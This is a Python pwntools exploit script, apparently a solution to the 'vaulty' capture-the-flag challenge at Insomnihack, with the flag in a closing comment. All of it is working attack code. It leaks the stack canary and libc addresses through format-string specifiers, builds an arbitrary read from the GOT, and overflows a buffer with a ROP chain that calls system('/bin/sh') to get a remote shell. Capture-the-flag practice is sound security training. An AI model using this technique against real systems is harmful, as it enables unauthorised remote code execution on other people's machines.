#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./vaulty_patched")
libc=exe.libc

context.binary = exe

REMOTE_NC_CMD    = "nc vaulty.insomnihack.ch 4556"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    def create_entry(v1,v2,v3):
        r.sendline(b"1")
        r.sendline(v1)
        r.sendline(v2)
        r.sendline(v3)
        r.recvuntil(b"URL: ")

    
    def print_entry(n):
        r.sendline(b"4")
        r.sendline(bstr(n))
        r.recvuntil(b"Username: ")
        canary = int(r.recvline()[:-1], 16)
        r.recvuntil(b"Password: ")
        leak = int(r.recvline()[:-1], 16)
        return (canary, leak)
    
    def arb_read(value):
        payload=b"%29$sBBB" + p64(value)
        create_entry(payload, payload, payload)
        r.sendline(b"4")
        r.sendline(b"1")
        r.recvuntil(b"Username: ")
        return u64(r.recv(6).ljust(8, b"\x00"))

    create_entry(b"%11$p", b"%13$p", b"%2$p")
    canary, leak = print_entry(0)

    exe.address = leak - 0x1984 #instruction after call print_entry()

    libc.address = arb_read(exe.got.puts) - libc.sym.puts

    rop = ROP(libc)
    POP_RDI = p64(rop.rdi.address)
    RET = p64(rop.ret.address)

    chain = POP_RDI + p64(libc.binsh()) + RET + p64(libc.sym.system)
    payload = b"A"*8*5 + p64(canary) + b"A"*8*3 + chain

    r.sendline(b"1")
    r.sendline(b"1")
    r.sendline(b"1")
    r.sendline(payload)

    r.interactive()
    #INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}

    
if __name__ == "__main__":
    main()